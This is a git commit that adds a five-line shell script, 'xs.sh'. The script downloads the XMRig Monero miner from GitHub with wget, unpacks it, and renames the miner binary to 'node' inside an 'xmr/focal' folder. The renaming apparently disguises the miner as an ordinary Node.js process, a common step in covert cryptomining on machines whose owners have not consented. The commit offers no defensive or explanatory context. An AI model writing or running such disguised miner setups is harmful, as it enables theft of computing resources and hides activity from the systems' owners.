b2fbcf1fdfab22bedc6e023ca5cc8939175d07cb
menju2ikg8uti <menju2ikg8uti@kolabnow.com>
2026-02-16 11:41:22 +0700

    Create xs.sh

---
+++ xs.sh
@@ -0,0 +1,5 @@
+mkdir xmr
+mkdir xmr/focal
+wget https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-focal-x64.tar.gz
+tar -xvf xmrig-6.25.0-focal-x64.tar.gz
+mv xmrig-6.25.0/xmrig xmr/focal/node
